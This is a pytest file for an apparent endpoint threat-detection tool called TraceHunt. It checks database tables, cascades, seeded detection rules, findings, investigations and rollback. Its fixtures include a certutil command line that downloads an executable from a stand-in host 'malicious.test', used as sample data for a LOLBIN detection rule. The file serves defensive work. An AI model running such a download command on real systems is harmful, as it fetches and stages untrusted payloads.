"""Database schema and model integrity tests for TraceHunt.

Validates:
1. Presence of all 9 required tables in schema
2. Foreign key enforcement and cascade behaviors
3. Unique constraints (RawEvent sha256_hash)
4. Model serialization and JSON fields
5. Transaction rollback guarantees on failure
6. Seeded detection rules
"""

from datetime import datetime, timezone
import pytest
from sqlalchemy import inspect
from sqlalchemy.exc import IntegrityError
from sqlalchemy.orm import Session

from tracehunt.database import get_db_session
from tracehunt.models import (
    AnalystAudit,
    DetectionRule,
    EndpointEvent,
    Finding,
    IngestionError,
    Investigation,
    InvestigationEvidence,
    ProcessRelationship,
    RawEvent,
)


def test_schema_contains_all_nine_tables(test_engine):
    """Verify that all 9 required tables from R&D Proposal Section 7 are registered and created."""
    inspector = inspect(test_engine)
    table_names = set(inspector.get_table_names())

    expected_tables = {
        "raw_events",
        "endpoint_events",
        "process_relationships",
        "detection_rules",
        "findings",
        "investigations",
        "investigation_evidence",
        "analyst_audit",
        "ingestion_errors",
    }

    missing = expected_tables - table_names
    assert not missing, f"Missing required database tables: {missing}"


def test_raw_event_persistence_and_hash_uniqueness(test_session: Session):
    """Verify RawEvent persistence and SHA-256 unique constraint enforcement."""
    raw1 = RawEvent(
        source="sysmon_json",
        source_event_id="1",
        raw_payload='{"EventID": 1, "Image": "cmd.exe"}',
        sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        parse_status="PENDING",
    )
    test_session.add(raw1)
    test_session.flush()

    assert raw1.id is not None
    assert raw1.ingested_at is not None

    # Attempting to insert another RawEvent with identical hash must fail
    raw_duplicate = RawEvent(
        source="sysmon_json_reimport",
        source_event_id="1",
        raw_payload='{"EventID": 1, "Image": "cmd.exe"}',
        sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        parse_status="PENDING",
    )
    test_session.add(raw_duplicate)
    with pytest.raises(IntegrityError):
        test_session.flush()
    test_session.rollback()


def test_endpoint_event_foreign_key_and_cascade(test_session: Session):
    """Verify EndpointEvent links to RawEvent and cascades deletion properly."""
    raw = RawEvent(
        source="sysmon_json",
        source_event_id="1",
        raw_payload='{"EventID": 1}',
        sha256_hash="hash_cascade_test_001",
        parse_status="PARSED",
    )
    test_session.add(raw)
    test_session.flush()

    event = EndpointEvent(
        raw_event_id=raw.id,
        event_time=datetime.now(timezone.utc),
        host="WIN-SEC-01",
        user="CORP\\analyst",
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=4100,
        parent_process_id=1200,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c whoami",
    )
    test_session.add(event)
    test_session.flush()

    event_id = event.id
    assert event_id is not None
    assert event.raw_event.id == raw.id

    # Deleting raw event should cascade to delete endpoint event
    test_session.delete(raw)
    test_session.flush()

    deleted_event = test_session.get(EndpointEvent, event_id)
    assert deleted_event is None


def test_process_relationship_parent_child_and_unresolved(test_session: Session):
    """Verify parent-child process relationship modeling, including unresolved parents."""
    now = datetime.now(timezone.utc)
    parent_ev = EndpointEvent(
        event_time=now,
        host="WIN-SEC-01",
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=1200,
        parent_process_id=400,
        image="C:\\Windows\\explorer.exe",
    )
    child_ev = EndpointEvent(
        event_time=now,
        host="WIN-SEC-01",
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=4100,
        parent_process_id=1200,
        image="C:\\Windows\\System32\\cmd.exe",
    )
    orphan_ev = EndpointEvent(
        event_time=now,
        host="WIN-SEC-01",
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=5200,
        parent_process_id=9999,  # Unseen parent
        image="C:\\Windows\\System32\\powershell.exe",
    )
    test_session.add_all([parent_ev, child_ev, orphan_ev])
    test_session.flush()

    # Normal parent-child relationship
    rel_normal = ProcessRelationship(
        host="WIN-SEC-01",
        parent_event_id=parent_ev.id,
        child_event_id=child_ev.id,
        parent_pid=1200,
        child_pid=4100,
        relationship_type="PARENT_CHILD",
        confidence="HIGH",
    )

    # Unresolved parent relationship (parent_event_id is None)
    rel_unresolved = ProcessRelationship(
        host="WIN-SEC-01",
        parent_event_id=None,
        child_event_id=orphan_ev.id,
        parent_pid=9999,
        child_pid=5200,
        relationship_type="UNRESOLVED_PARENT",
        confidence="UNRESOLVED",
    )

    test_session.add_all([rel_normal, rel_unresolved])
    test_session.flush()

    assert rel_normal.id is not None
    assert rel_normal.parent_event.process_id == 1200
    assert rel_unresolved.parent_event is None
    assert rel_unresolved.confidence == "UNRESOLVED"


def test_seeded_rules_and_finding_traceability(test_session: Session):
    """Verify default rules are present and findings trace back to source endpoint events."""
    rule = test_session.get(DetectionRule, "RULE-001-LOLBIN")
    assert rule is not None
    assert rule.name == "Suspicious LOLBIN Execution"
    assert rule.severity == "HIGH"

    event = EndpointEvent(
        event_time=datetime.now(timezone.utc),
        host="WIN-SEC-01",
        user="CORP\\john.doe",
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=6120,
        parent_process_id=4100,
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://malicious.test/p.exe",
    )
    test_session.add(event)
    test_session.flush()

    finding = Finding(
        rule_id=rule.id,
        endpoint_event_id=event.id,
        severity="HIGH",
        confidence="HIGH",
        rationale="certutil.exe invoked with -urlcache download flag",
        matched_fields={
            "image": "certutil.exe",
            "flag": "-urlcache",
            "url": "http://malicious.test/p.exe",
        },
        caveats="Legitimate administrators may use certutil for CRL caching.",
    )
    test_session.add(finding)
    test_session.flush()

    assert finding.id is not None
    assert finding.rule.id == "RULE-001-LOLBIN"
    assert finding.endpoint_event.id == event.id
    assert finding.matched_fields["flag"] == "-urlcache"


def test_investigation_evidence_and_analyst_audit(test_session: Session):
    """Verify complete case management lifecycle with evidence links and immutable audit logs."""
    inv = Investigation(
        id="INV-2026-TEST-001",
        host="WIN-SEC-01",
        title="Suspicious Living-off-the-Land Activity",
        status="OPEN",
        summary="Investigating certutil execution by user john.doe",
    )
    test_session.add(inv)
    test_session.flush()

    # Create event and finding
    event = EndpointEvent(
        event_time=datetime.now(timezone.utc),
        host="WIN-SEC-01",
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=9000,
    )
    test_session.add(event)
    test_session.flush()

    finding = Finding(
        rule_id="RULE-001-LOLBIN",
        endpoint_event_id=event.id,
        severity="HIGH",
        confidence="HIGH",
        rationale="LOLBIN match",
        matched_fields={"image": "certutil.exe"},
    )
    test_session.add(finding)
    test_session.flush()

    # Link evidence
    evidence = InvestigationEvidence(
        investigation_id=inv.id,
        endpoint_event_id=event.id,
        finding_id=finding.id,
        sequence_number=1,
        notes="Primary attack indicator",
    )
    test_session.add(evidence)

    # Record analyst disposition audit entry
    audit = AnalystAudit(
        investigation_id=inv.id,
        action="DISPOSITION_RECORDED",
        reviewer="sanya.security",
        comment="Confirmed malicious payload download attempt. Escalating to incident response.",
        previous_status="OPEN",
        new_status="CLOSED_TRUE_POSITIVE",
    )
    test_session.add(audit)
    inv.status = "CLOSED_TRUE_POSITIVE"
    test_session.flush()

    assert len(inv.evidence_items) == 1
    assert inv.evidence_items[0].finding.id == finding.id
    assert len(inv.audit_records) == 1
    assert inv.audit_records[0].reviewer == "sanya.security"
    assert inv.status == "CLOSED_TRUE_POSITIVE"


def test_ingestion_error_persistence(test_session: Session):
    """Verify unparseable or corrupted lines are stored in ingestion_errors table."""
    err = IngestionError(
        source="malformed_sysmon.json",
        error_type="JSON_PARSE_ERROR",
        details="Expecting value: line 42 column 1 (char 892)",
        raw_record_snippet='{"EventID": 1, "Image": "powershell.exe", truncated...',
    )
    test_session.add(err)
    test_session.flush()

    assert err.id is not None
    stored_err = test_session.get(IngestionError, err.id)
    assert stored_err is not None
    assert stored_err.error_type == "JSON_PARSE_ERROR"


def test_transaction_rollback_guarantee(test_engine):
    """Verify that get_db_session rolls back database state when an unhandled exception occurs."""
    with pytest.raises(RuntimeError):
        with get_db_session(test_engine) as session:
            raw = RawEvent(
                source="test_rollback",
                raw_payload='{"test": 1}',
                sha256_hash="hash_rollback_test",
                parse_status="PENDING",
            )
            session.add(raw)
            session.flush()
            # Trigger failure before exiting context manager
            raise RuntimeError("Simulated transaction failure")

    # Verify that the uncommitted record was not persisted
    with get_db_session(test_engine) as session:
        found = session.query(RawEvent).filter_by(sha256_hash="hash_rollback_test").first()
        assert found is None
